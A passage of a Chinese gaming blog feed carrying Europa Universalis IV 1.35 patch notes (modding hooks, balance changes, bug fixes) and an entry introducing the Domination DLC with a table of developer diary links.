war</li><li>Added subject trait opinion_cost_to_join_offensive_wars &#x3D; <int> #Defines how much opinion the subject loses of the overlord to call the subject into an offensive war. Applied if you do not have Leviathan</li><li>Added subject trait opinion_cost_to_join_defensive_wars &#x3D; <int> #Defines how much opinion the subject loses of the overlord to call the subject into a defensive war. Applied if you do not have Leviathan</li><li>Added subject trait opinion_cost_instead_of_favors_cost &#x3D; yes&#x2F;no #Determines if the subject requires favors or opinion to join a war. If set “yes” then it requires the aforementioned opinion costs * regardless if Leviathan is active or not. “No” is the default setting</li><li>Added subject trait opinion_on_subject_integration &#x3D; -30 #Determines how much opinion they lose when a fellow subject gets integrated. Right now it is hardcoded to be -30 per integration but not every subject should be equally annoyed by it.</li><li>Added the government attribute can_inherit_personal_unions &#x3D; yes&#x2F;no #En* or disables the ability to inherit PUs</li><li>Added the government attribute force_general_leader &#x3D; yes&#x2F;no #”yes” forces your ruler to become a general when he gets to power. Works like force_admiral_leader &#x3D; yes. “no” is the default setting</li><li>Added the government attribute block_cultural_union &#x3D; yes&#x2F;no #”Yes” disables Cultural Unions entirely for you. “yes” is the default setting and doesn’t change anything</li><li>Added the government attribute has_cultural_union &#x3D; yes&#x2F;no #”yes” means that your country has the cultural union already regardless of your development or government rank. “no” is the default setting and lets you behave like normal</li><li>Added the government attribute has_pasha &#x3D; yes and separated it from has_janissaries &#x3D; yes</li><li>Added the privilege argument loyalty_scaled_conditional_modifier &#x3D; { trigger &#x3D; { <triggers> } modifier &#x3D; { <modifiers> } } #(at 100% Loyalty &#x3D; 100% effect of the modifier)</li><li>Added the privielge argument influence_scaled_conditional_modifier &#x3D; { trigger &#x3D; { <triggers> } modifier &#x3D; { <modifiers> } } #(at 100% Influence &#x3D; 100% effect of the modifier)</li><li>Added the privilege mechanic no_estate_crownland_loss_from_developing #Prevents crown land loss for an estate from developing provinces</li><li>Added on_colony_finished &#x3D; {} #ROOT &#x3D; is the colony which just finished, fires whenever a province gets colonized * regardless if it was done by a colonist or not (which means Siberian Frontier colonies would trigger this on_action too when they done)</li><li>Added on_colony_established &#x3D; {} #Is called when a province gets fully colonized * either through a colonist or through the Siberian Frontier. ROOT &#x3D; province, FROM &#x3D; country which colonizes the province</li><li>Added on_colonial_nation_established &#x3D; {} #Is called when a colonial nation is created. ROOT &#x3D; the new colonial nation, FROM &#x3D; the overlord of the colonial nation.</li><li>Added on_advisor_hired &#x3D; {} #ROOT &#x3D; is the country which hires the advisor, fires for all categories</li><li>Added on_adm_advisor_hired &#x3D; {} #ROOT &#x3D; is the country which hires the advisor, fires for the adm category</li><li>Added on_dip_advisor_hired &#x3D; {} #ROOT &#x3D; is the country which hires the advisor, fires for the dip category</li><li>Added on_mil_advisor_hired &#x3D; {} #ROOT &#x3D; is the country which hires the advisor, fires for the mil category</li><li>Added on_core &#x3D; {} #ROOT &#x3D; province which gets cored, FROM &#x3D; coring country, fires whenever a province gets cored by a country * either through the manual action or through the “add_core &#x3D; <country>“ effect</li><li>Added on_adm_tech_taken &#x3D; {} #ROOT &#x3D; is the country that is taking a new admin tech</li><li>Added on_dip_tech_taken &#x3D; {} #ROOT &#x3D; is the country that is taking a new diplomatic tech</li><li>Added on_mil_tech_taken &#x3D; {} #ROOT &#x3D; is the country that is taking a new military tech</li><li>Added on_barrage &#x3D; {} #ROOT &#x3D; is the country using barrage on the province, FROM &#x3D; is the province which gets barraged</li><li>Added on_naval_barrage &#x3D; {} #ROOT &#x3D; is the country using naval barrage on the province, FROM &#x3D; is the province which gets naval barraged</li><li>Added on_scorch_earth &#x3D; {} #ROOT &#x3D; is the country using scorch earth on the province, FROM &#x3D; is the province which gets scorched</li><li>Added on_parliament_debate_reset &#x3D; {} # ROOT &#x3D; country</li><li>Added on_parliament_seat_given &#x3D; {} # ROOT &#x3D; province, triggers when you give a seat to a province</li><li>Added on_parliament_seat_lost &#x3D; {} # ROOT &#x3D; province, triggers when a province loses its parliament seat</li><li>Added on_alliance_broken &#x3D; {} #Country scope, triggers when an alliance gets dissolved * it does not matter how (be it through the diplomatic action, through a war, through a peace treaty or through one of the partners becoming the subject of the other county) ROOT &#x3D; is the “first” alliance partner which means the country which created the alliance, FROM &#x3D;, is the “second” alliance partner who accepted the alliance offer</li><li>Added on_royal_marriage_broken &#x3D; {} #Country scope, triggers when a royal marriage gets dissolved * it does not matter how (be it through the diplomatic action, through a war, through a peace treaty or through one of the partners becoming the subject of the other county) ROOT &#x3D; is the “first” partner which means the country which originally offered the royal marriage, FROM &#x3D;, is the “second” alliance partner who accepted the offer</li><li>Added on_mandate_reform_passed &#x3D; {}</li><li>Added mercenary trait counts_towards_force_limit &#x3D; no #Removes the contribution to the force limit from the mercenary company when hired</li><li>Added mercenary trait max_size &#x3D; <int> #Limits the size of this mercenary company. If a merc company would be larger than the max size allows then every additional “would be” regiment will be transferred to the company’s manpower pool. If not set or if “-1” then it is the default setting.</li><li>Added mercenary trait min_size &#x3D; <int> #Limits the minimum size of this mercenary company. So if you hire a merc company it will ALWAYS have at least as many regiments as min_size demands it to be. If it’s bigger than “max_size” then it should throw an error in the error log and be deactivated. If not set or if “-1” then it is the default setting.</li><li>Added mercenary trait no_additional_manpower_from_max_size &#x3D; yes #A flag for the merc company which disallows the behavior that every single additional “would be” regiment over max_size will be turned into company manpower. “no” is the default.</li><li>Added mercenary trait manpower_pool &#x3D; <double> #Defines how large the manpower pool of the merc company is. Merc Manpower modifier uses this as the base to modify. At default, it is -1 which means it just uses the normal way of calculating the available manpower for the merc company</li><li>Added building argument on_construction_started &#x3D; { <effects on province scope> } #Gets called when you start building a building</li><li>Added building argument on_construction_canceled &#x3D; { <effects on province scope> } #Gets called when you cancel a building construction</li><li>Centers of Reformation can now spawn in other continents than the ones of their religion’s center_of_religion</li><li>Added the scripted function can_remove_idea_group which can disallow you to remove idea groups</li><li>Added potential &#x3D; {} to decrees, fervors, golden_bulls, isolationism, personal_deities, gurus and trading policies</li><li>Added trigger &#x3D; {} to decrees and fervors. Replaced “allowed &#x3D; {}” of personal_deities with “trigger &#x3D; {}”</li><li>Added the define JANISSARIES_STARTING_STRENGTH</li><li>Added the define JANISSARIES_STARTING_MORALE</li><li>Added land_units_killed_var, land_units_lost, naval_units_killed_var and naval_units_lost variables which are set after each battle. They do not count the total amount of killed units throughout the game.</li><li>Added argument for parliament issues backing_percentage &#x3D; <int> #Determines how many seats will back up the issue. backing_percentage &#x3D; 100 would mean all seats would back it up, backing_percentage &#x3D; 0 means no seat backs it up. If undefined then the game uses the PARLIAMENT_BACKING_PERCENTAGE from Defines</li><li>Added argument for parliament issues effect_duration &#x3D; <int> #Determines how long the effects of a passed debate last, and also the amount of time before you can debate the next issue after passing one. If undefined then the game uses the PARLIAMENT_EFFECT_DURATION from the Defines.</li><li>Added argument for parliament issues debate_duration &#x3D; <int> #Determines how long the debate will go before it gets into the phase where it can be randomly closed. If undefined then the game uses the PARLIAMENT_DEBATE_DURATION from the Defines.</li><li>Added argument for parliament issues chance_of_decision &#x3D; <float> #Determines the chance debate is ended after debate_duration &#x2F; PARLIAMENT_DEBATE_DURATION. Defaults to PARLIAMENT_CHANCE_OF_DECISION</li><li>Added argument for parliament bribe chance &#x3D; { factor &#x3D; <float> } #chance argument for a bribe to appear. Parliament issues already have this chance section</li><li>Added scope papal_controller &#x3D; {} #Scopes to the Papal Controller</li></ul><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="成就"><a href="#成就" class="headerlink" title="成就"></a>成就</h3><ul><li>成就“波罗的海十字军”现在不再要求你殖民两块乌拉尔地区的省份（很抱歉这本来应该早点修复的）。</li><li>成就“印度之主”在拥有一名拥有着整个印度的附属国的情况下也可以完成。</li><li>成就“为了皇帝”在你选择扮演释放出来的属国的情况下也可以完成，总之我们不是有意限制这种方式的。</li></ul><h3 id="决议"><a href="#决议" class="headerlink" title="决议"></a>决议</h3><ul><li>Confirming Thalossacracy now unlocks a new government reform for tier 8 which allows you to establish Trade Protectorates.</li><li>The “Rein in Italy” has now a better tooltip, explaining what you are supposed to do.</li><li>The decision “Formalize Separation of Powers” is now available to every country with a parliament. The modifier “Separation of Power” now also gives a +3% Backing Chance for Parliament Issues.</li><li>The piety gained from Muslim decisions is now negative when you have negative Piety already.</li><li>Forming Egypt will no longer force you into a kingdom rank if you are already an empire.</li><li>Junior partners can adopt the Hussite faith via decision, their ruler will remain their overlord’s religion.</li><li>Gaining the Sich Rada from the decision no longer blocks the decision. This means you will always have the opportunity to regain this reform.</li><li>Decisions that change your government will no longer remove reform levels.</li></ul><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><ul><li>Nzinga of Ndongo and Matamba is now of whatever culture you are.</li><li>Nahuatl Event ‘Pochteca Traders Harassed’ no longer grants a CB that lasts 152 years.</li><li>You can now see the “X Institution has Spawned” event even if you can’t see its origin.</li><li>Granting Malta to the Knights will now give access to the San Juan Holy Order for owners of the Golden Century DLC.</li><li>The Nordic countries will no longer flip back to Catholicism when they proceed in their mission trees.</li><li>The Ethiopian AI will no longer move its capital through an event to a province that has not been fully colonized yet.</li><li>The Sisters Takeover for Orleans now gives a unique Tier 1 government reform.</li><li>The event for unifying the HRE will no longer create a grocery list that tries to escape the screen.</li><li>The event “A Helping Hand” now costs max 500 Ducats when you decide to get an advisor.</li><li>The event “The Maid of $PROVINCE$” no longer removes legitimacy for the PU overlord. Also, the general generated has now 50 Army Tradition and is always female.</li><li>Added an event to the mission tree of Finland which allows you to change your name to one of the Finish Empires.</li><li>Added an event to the Kongo mission tree which asks you if you want to become a monarchy or stay as a tribe.</li><li>The event “Consultation of the Monasteries” gives now Karma scaled with the amount of Karma you have right now. As an example: if you are above 90 Karma you would lose 25, above 50 you lose 15, above 25 you lose 10 and otherwise you lose 5. Vice versa for negative Karma is also true.</li><li>Good Monsoons now give +20% Local Tax Modifier instead of -20% Local Dev Cost.</li><li>The event “The Agenda of the Diet” now supports up to 6 estates at the same time instead of just 3.</li><li>Added an event that fires when you dissolve the Holy Roman Empire. The events give now the 100 Prestige (which turn into Monarch Power when overflowing), 200 Splendor, and 25 Power Projection.</li><li>The event Event A Helping Hand will not fire if all owned great projects are already fully upgraded.</li></ul><h3 id="理念"><a href="#理念" class="headerlink" title="理念"></a>理念</h3><ul><li>Norse ideas no longer overwrite all of your ideas if you just happen to have the Norse culture and religion.</li><li>Ruthenian’s ideas have been buffed. They have now 20% Manpower Recovery Speed and -10% Morale Damage Received in their traditions. Foreign Influence now gives +2 Number of Accepted Cultures and -25% Promote Culture Cost. Zaporizhian Cossacks now give +1 Privilege Slots to the Cossacks. Reuniting Rus gives now -a 10% Core Creation Cost and Birth of Russian Orthodoxy now increases Tolerance of True Faith by 2 and Yearly Patriarch Authority by 0.5.</li><li>All ideas which increase Land Forcelimit Modifiers by 33% have their value decreased to 25%.</li><li>Russia’s ideas have been adjusted. Their tradition now gives -a 15% Core Creation Cost. Land of the Rus now gives -a 15% AE reduction. Life-long Conscription now increases the Land force limit by 33% instead of 50%. Abolishing the Mestnichestvo now decreases the Nobility’s Influence by 10%.</li><li>Ideas that have a Free Leader have their ideas now altered. Traditions and Ambitions with the Free Leader have a new modifier replacing the leader one. Everywhere else a second idea has been added.</li><li>The English idea “Bill of Rights” now gives +1 Num of Parliament Issues. The English Ambition now gives +10% Morale for Navies.</li><li>Reworked Siamese ideas and nerfed their power level considerably.</li><li>Added +2 Artillery Shock to Smolensk’s ideas. BOOM!.</li><li>The British ideas of “Merchant Navy” and “City Upon a Hill” have been combined into one. Instead of the “Merchant Navy” idea, GB now gets the “British Parliament” idea, giving -1 Global Unrest and +1 Number of available Issues.</li><li>Orisa’s tradition now gives +10% Production Efficiency (previously +5%).</li><li>Adjusted the Ottoman ideas. They now have -25% CCR (previously -20%), +15% Global Tax (previously +10%), +10% Reform Progress Growth (new), -2 Global Unrest (replacing the -10% War Exhaustion Reduction Cost) and +0.5 Yearly Naval Tradition (new).</li><li>Qing’s Core Creation Cost from its ideas has been buffed from 20% to 25% so it can keep up with Yuan.</li><li>Adjusted the French ideas. They now have -50% War Taxes Cost (in addition to +10% National tax), +15% Morale of Armies and +0.5 Yearly Army Tradition (replacing +20% Morale of Armies), National Unrest -1 and +10% Reform Progress Growth (replacing the +1 Diplomatic Relation), -10% Core Creation Cost and +5 Maximum Absolutism (replacing the -10% Technology Cost), +15% Fort Defense and +50% Garrison Army Damage (instead of -20% Fort Maintenance), and -10% Development Cost as a Tradition (replacing the +2 Tolerance of Heretics and +2 Tolerance of Heathens).</li><li>Added a new set of National Ideas for Revolutionary France.</li><li>Adjusted the Spanish Ideas. They now have Church Power and Fervor in case of being Protestant or Reformed (added to Devout Christianism), replaced the Treasure Fleet idea with the Castilian idea School of Salamanca and added +10% Reform Progress Growth to it, A Spanish Armada now gets +25% Naval Force Limit modifier (replaces +1 Naval Leader Maneuver, which has been moved to Grand Armada Naval Doctrine), added -5 Estate Loyalty on Revoking Privileges to Rein in the Cortes.</li><li>Adjusted the Castilian ideas. The Tradition now has a +25% Naval Force Limit Modifier (replaces +25% Marines Force Limit), and +10% Reform Progress Growth (added to School of Salamanca idea).</li></ul><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><ul><li>You can now complete the Polish mission ‘Delegate with the Emperor’ as the Emperor of the HRE.</li><li>The English “Strategic Control” is no longer soft-blocked when you force a PU over France before finishing the mission.</li><li>The Burgundian mission “Chivalry is not Dead” now gives +25 Permanent Power Project. This is mostly a small addition to them as the Angevin Kingdom uses the same event.</li><li>The Polish mission ‘Break Livonia’ now grants claims to conquer Pomerania.</li></ul><h3 id="开局设定"><a href="#开局设定" class="headerlink" title="开局设定"></a>开局设定</h3><ul><li>Added a missing escalated level of crownland between 80 and 100.</li><li>Renamed the province Kelang to Tamsui.</li><li>Valladolid is now part of the North Castile area and Asturias is now part of the Leon area.</li><li>Renamed the Asturias and Castile areas to North and South Castile.</li><li>Changed the trade goods of many provinces in Iberia to better reflect historical accuracy.</li><li>Muscovy is now a Historical Rival of the Great Horde.</li><li>Aveiro and Algarvae now produce Salt.</li><li>The Patagonia and Amazonas trade node now has a connection to Cuiaba. Lima has now a connection to the Polynesian Triangle. These changes aim to make colonizing South America more profitable for Asian countries.</li><li>Zaporizhzhia has now Eastern technology instead of Nomad one.</li><li>The Hudson Bay Trade now flows into California.</li><li>The Anatolian minors now start with the Beylik government reform.</li><li>All French appanages now start with the Appanage government reform.</li><li>The starting ruler of Augsburg now remembers that he went to university at some point and has gained 4 Diplo points.</li><li>The Great Horde has now its capital in Sarai. Additionally, Sarai now starts with the “Tatar Yoke” triggered province modifier if Domination is active.</li></ul><h3 id="其它-3"><a href="#其它-3" class="headerlink" title="其它"></a>其它</h3><ul><li>You will no longer be informed that seizing land will cause rebels when you have a government reform that disables rebels spawning from seizing crown land.</li><li>Colonial subjects should no longer get access to “Establish a Colonial Subject” Estate Agendas.</li><li>Pashas now give -20% Local Governing, 20% Local Minimum Autonomy, -0.1 Monthly Local Autonomy (basically, they have a higher base Autonomy, but they reach this base faster now), -33% Local State Maintenance Modifier and +10 Local Tolerance of Heathens.</li><li>Zhuang can now be sinicized.</li><li>The Zacatecas Great Project now ensures the province has Gold.</li><li>AI has now a 90% chance to automatically complete an estate agenda.</li><li>Self Governing Colonies now have access to Burghers and Nobles. (Note: Judging the events for the colonies, they were intended to have them ever since 1.31…).</li><li>Combined the special unit custom nation ideas into one.</li><li>Moved many random events from the bi-yearly pulse to an empty 4-yearly pulse to increase performance and, paradoxically, make them more likely to fire in the game.</li><li>The state edict “Centralization Effot” now decreases local autonomy by -0.03 instead of.</li><li>The global modifier “Disembark Time” has been renamed into “Disembark Speed”.</li><li>All Estate disasters can now gain progress unless their respective estate hast at least 60% Loyalty instead of 50%.</li><li>Forming the Holy Roman Empire with Domination adds a new Holy Imperial Monarchy to your country.</li><li>The Ikko-Ikki rebels will now try to enforce the Ikko-Ikki government reform.</li><li>The admin costs of Subject Upgrades now scale down with all power cost modifiers.</li><li>The French Wars of Religion can now also fire if you are Hussite or Anglican.</li><li>Forming Scandinavia while having the Unified Kalmar Monarchy reform will now form Scandinavia but with the “Kalmar Union” as a name and the yellow from the flag as the map color.</li><li>The Religious Turmoil disaster can now fire for Hussite and Anglican countries too.</li><li>Added a Casus belli for Confucian nations against countries with other religions when you get the “Deus Vult” CB or when you finish Humanist ideas. The reason for this addition is the impossibility to use the Deus Vult CB against countries which religion you have harmonized with.</li><li>Added the “Sultanate of Rûm” and the “Ruthenian Tsardom” as new government reforms for Rûm and Ruthenia.</li><li>The triggered province modifier “Paektu Mountain” can now be active too if the religion of the province is Mahayana.</li><li>The triggered modifier for the occupation of Rome is now province-triggered.</li><li>Mali is no longer an endgame tag.</li><li>You can no longer gain the “Babbling Buffoon” ruler trait if you have more than 5 diplomatic stats.</li><li>The Naval Doctrine of Portugal now decreases Naval Barrage cost by 50%.</li><li>Replaced the bonus for the Korean naval doctrine with a +20% Hull Size Modifier.</li><li>Estate breakaways from the Cossacks are now Eastern and have the Sich Rada reform. They are no longer hordes.</li><li>The Unify China Casus belli now gives only territorial cores instead of full cores upon occupying a province.</li><li>Strong Duchies is now available if you have a combination of 2 marches, vassals or personal unions.</li><li>The government reform “Separate the Clergy from State” now also disables the Brahmin’s estate.</li><li>The Teutons are properly no longer accepted to join the HRE when they choose to stick to their crusader path.</li><li>Re-enabled the event “National decline”.</li><li>The event “Prospering Times” now upgrades a province greatly as it is a one-time-only event for countries.</li><li>The event “Incompetent Cousin” now specifies which of your subjects the cousin has.</li><li>Adjusted the colonial borders of the new world so they no longer split areas apart.</li><li>Added to the events “The Republic of Salé” and “The Pirate Queen of Tétouan” a third option that allows you to ignore the Pirate Republic entirely. The AI will still always release the pirates.</li><li>The Naval Doctrine ‘Grand Armada’ now also grants +25 Marines force limit +1 Naval Leader Maneuver.</li></ul><h2 id="Bug修复"><a href="#Bug修复" class="headerlink" title="Bug修复"></a>Bug修复</h2><ul><li>Fixed OOS related to cardinal IDs.</li><li>Fixed desync related to countries that are called to join a war but haven’t yet for hot joiners.</li><li>Fixed CTD related to losing merchants when the trade node interface is open.</li><li>Fixed a desync that could happen when a country changes religion, invites a religious scholar, and there’s a player that’s lagging enough.</li><li>Fixed so the build flagship button is greyed out when light ships cost more than heavies and you can’t afford it.</li><li>Fixed OOS related to modifier from trade centers applied to countries not resetting when trade center decreases in level.</li><li>OOS fix related to mercenary companies keeping track of which country they belong to, which didn’t handle tag switching.</li><li>Fixed issue with automated improved relations entry text in outliner that wouldn’t align to the right.</li><li>Fixed so that terrain bonus for combat map marker is displayed positive for positive values.</li><li>Improved logic for automatically computing the amount of money when demanding&#x2F;offering peace.</li><li>Fixed issues with random factors regarding missions and their events always being the same.</li><li>Fixed a crash related to government reform properties not existing.</li><li>Moved federation strength computation to code, removed script functions with effects due to them causing crashes&#x2F;desyncs.</li><li>Fixed an issue where the “carolean_infantry” where mentions Cawa units instead of Carolean units.</li><li>Fixed policies “Diplomatic Consolidation Act” and “Colonial Improvement Act” not displaying any value in the policy window.</li><li>Fixed on actions triggers when culture and religion change via the events.</li><li>Fixed desync in great projects executing on_built effect when loading a save game.</li><li>Fixed issue with ambient map objects visibility is reset after loading a save.</li><li>The event “Muslim-Born Men Enroll as Janissaries” gives now 5% Discipline to the Janissaries instead of a pathetic 1.5% (which was originally supposed to be 15% Discipline apparently…).</li><li>Fixed several script-related errors which inflated the error log over the period of a game.</li><li>Fixed a race condition crash related to AI taking decisions.</li><li>The special_units_forcelimit modifier now applies to all special units.</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>Paradox 论坛：<a href="https://forum.paradoxplaza.com/forum/index.php?threads/1578390" title="forum:1578390">EU4: 1.35 Domination is now LIVE! Checksum [d460] - NOT FOR PROBLEM REPORTS!</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 日志 </tag>
            
            <tag> 更新 </tag>
            
            <tag> 版本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《欧陆风云4》发布新DLC——霸业</title>
      <link href="/de6a4da1.html"/>
      <url>/de6a4da1.html</url>
      
        <content type="html"><![CDATA[<p><strong>霸业</strong>[<strong>暂译!<strong>]（英文：</strong>Domination</strong>）是欧陆风云4的第20个扩展包。它于2023年3月6日首次公布；该DLC将与1.35版本一同推出。</p><h2 id="扩展包特性"><a href="#扩展包特性" class="headerlink" title="扩展包特性"></a>扩展包特性</h2><p>在《欧陆风云4》的扩展包《霸业》中，重回历史上最强大、最受玩家喜爱的几个国家。《霸业》以近代早期的几个伟大帝国为中心，为游戏中的几大强权提供了新的任务树、政府改革、阶层管理及事件。这些热门的起始国家现在拥有新的内容，平衡性也经过调整，除了加深历史深度，还有更令人期待的奖励和分支任务树，玩家的选择也可能因此对历史进程产生巨大的影响。</p><p>《欧陆风云4：霸业》包含下列新的国家任务树和功能：</p><ul><li>奥斯曼帝国：翻新后的征服任务树为拓展奥斯曼帝国的支配地位提供全新奖励，包括通过新的行省机制进行扩张，以及全新的内政变动，例如新增的耶尼切里阶层与奥斯曼内部权力斗争。</li><li>中国：为汉人王朝 大明以及后起的入侵者 大清等国家添加不同任务树。在对外扩张和内圣之道两种发展路线中做出选择，并对抗宦官势力，以建立更稳固的帝国。</li><li>日本：在与幕府将军和独立大名的势力周旋的同时团结日本。选取对外开放或保持孤立，同时在不同的扩张和改革路线中做出抉择。</li><li>俄罗斯：将您的国家从鞑靼之轭解放出来，将其转变为伟大帝国。选择彼得大帝的改革之路带领国家现代化，您的任务树和机制便会随着游戏进行而逐步演变。利用哥萨克和射击军的力量，将您的帝国向东西两面扩张。</li><li>西班牙：扩展 卡斯蒂利亚与 阿拉贡的任务树，具有成立西班牙国家的不同道路、可用于全新西班牙君主政体的新机制，以及解锁强悍的大方阵与西班牙无敌舰队的陆海军决议。</li><li>法兰西：结束百年战争，进行集权化统治以将法兰西转变为绝对君主制国家，同时应对宗教战争的挑战，向外扩张到意大利和神圣罗马帝国，并通过扩展后的任务树引领革命。</li><li>大不列颠：拥有殖民帝国与安茹王朝的不同分支路，以及更深奥的内政玩法，具有英国议会的独特功能与英国内战灾难的更改。</li><li>其他国家： 普鲁士、 葡萄牙与 朝鲜的任务更改、全新政体机制与特色扩展。</li></ul><p>《霸业》还包含：</p><ul><li>全新历史细节：为许多主要国家添加了政府改革和阶层特权。例如，奥斯曼将拥有多种新的改革，而俄罗斯的贵族和市民则会有多项新特权。</li><li>全新特殊单位：添加三种全新类型的陆地特殊单位，日本的“武士”、西班牙的“大方阵”和法国的“火枪队”，并添加海上特殊单位功能，包括葡萄牙、西班牙、大不列颠、朝鲜、尼德兰、热那亚和威尼斯的 6 种特殊单位。</li><li>全新美术：来自四个西方文化和四个东方文化的 32 个全新单位图像。</li><li>全新音乐：三首全新法国风乐曲、三首全新土耳其风乐曲，以及三首全新中国风乐曲。</li></ul><h2 id="开发者日志"><a href="#开发者日志" class="headerlink" title="开发者日志"></a>开发者日志</h2><p>所有与扩展包<strong>霸业</strong>[<strong>暂译!<strong>]（英文：</strong>Domination</strong>）及1.35版本有关的开发者日志。</p><p>1.35版本</p><p>编号</p><p>原文链接</p><p>译文链接</p><p>描述</p><p>日期</p><p>15</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1577208" title="forum:1577208">1.35 ‘Ottomans’ Changelog</a></p><p><a href="https://www.bilibili.com/read/cv23010181">EU IV - 开发日志 2023 年 4 月 11 日 - 1.35版本号“奥斯曼人”</a></p><p>1.35版本“奥斯曼人”及DLC霸业的版本更新补丁日志</p><p>2023-04-11</p><p>14</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1576930" title="forum:1576930">1.35 Achievements</a></p><p><a href="https://www.bilibili.com/read/cv22855726">EU IV - 开发日志 2023 年 4 月 4 日 - 成就</a></p><p>1.35版本新增的9个新成就</p><p>2023-04-04</p><p>13</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1576007" title="forum:1576007">Domination Art and Unit Models</a></p><p><a href="https://www.bilibili.com/read/cv22708644">EU IV - 开发日志 2023 年 3 月 28 日 - 霸业兵模包</a></p><p>新扩展包美术展示：部分任务树图标、事件图片；新增8种兵模；新增加载画面</p><p>2023-03-28</p><p>12</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1575043" title="forum:1575043">1.35 Balance Changes and Usermodding Additions</a></p><p><a href="https://www.bilibili.com/read/cv22559594">EU IV - 开发日志 2023 年 3 月 21 日 - 平衡变化和玩家模组新增功能</a></p><p>1.35版本的部分平衡性改动；1.35版本新增的用户模组制作相关内容</p><p>2023-03-21</p><p>11</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1573688" title="forum:1573688">Government Mechanics + Free Content</a></p><p><a href="https://www.bilibili.com/read/cv22410044">EU IV - 开发日志 2023 年 3 月 14 日 - 特殊机制与免费内容</a></p><p>新增的部分政府特殊机制（包含于扩展包中），以及部分免费更新内容，如理念组、政策、政府改革、阶层特权等等</p><p>2023-03-14</p><p>10</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1572369" title="forum:1572369">All Blue</a></p><p><a href="https://www.bilibili.com/read/cv22267685">EU IV - 开发日志 2023 年 3 月 7 日 - 几大坨蓝</a></p><p>关于普鲁士、葡萄牙和朝鲜的新内容</p><p>2023-03-07</p><p>9</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1571232" title="forum:1571232">Great Britain</a></p><p><a href="https://www.bilibili.com/read/cv22121878">EU IV - 开发日志 2023 年 2 月 28 日 - 大不列颠</a></p><p>关于大不列颠的新内容</p><p>2023-02-28</p><p>8</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1570083" title="forum:1570083">Spain</a></p><p><a href="https://www.bilibili.com/read/cv21972875">EU IV - 开发日志 2023 年 2 月 14 日 - 法兰西</a></p><p>关于西班牙的新内容</p><p>2023-02-21</p><p>7</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1568575" title="forum:1568575">Empire of France</a></p><p><a href="https://www.bilibili.com/read/cv21833602">EU IV - 开发日志 2023 年 2 月 14 日 - 法兰西</a></p><p>关于法国的新内容</p><p>2023-02-14</p><p>6</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1567595" title="forum:1567595">Tsardom of Russia</a></p><p><a href="https://www.bilibili.com/read/cv21695844">EU IV - 开发日志 2023 年 2 月 7 日 - 俄罗斯</a></p><p>关于俄罗斯的新内容</p><p>2023-02-07</p><p>5</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1566648" title="forum:1566648">Shogunate of Japan</a></p><p><a href="https://www.bilibili.com/read/cv21533946">EU IV - 开发日志 2023 年 1 月 31 日 - 日本</a></p><p>关于日本的新内容</p><p>2023-01-31</p><p>4</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1565995" title="forum:1565995">Ottoman Empire 1.35</a></p><p><a href="https://www.bilibili.com/read/cv21401051">EU IV - 开发日志 2023 年 1 月 24 日 - 奥斯曼</a></p><p>关于奥斯曼的新内容</p><p>2023-01-24</p><p>3</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1565232" title="forum:1565232">1.35 Emperor of China</a></p><p><a href="https://www.bilibili.com/read/cv21277552">EU IV - 开发日志 2023 年 1 月 17 日 - 神州皇帝</a></p><p>关于中华大区的新内容</p><p>2023-01-17</p><p>2</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1562834" title="forum:1562834">Unit Pip Rebalance</a></p><p> </p><p>1.35版本对单位点数的平衡性改动</p><p>2022-12-20</p><p>1</p><p><a href="https://forum.paradoxplaza.com/forum/index.php?threads/1562011" title="forum:1562011">Roadmap to 1.35</a></p><p> </p><p>接下来一段时期及新版本开发的路线图；理念组的调整</p><p>2022-12-13</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> dlc </tag>
            
            <tag> 霸业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steam喜加一，《桌面地下城》免费领取！索尼游戏全面反向打折！</title>
      <link href="/19758c0a.html"/>
      <url>/19758c0a.html</url>
      
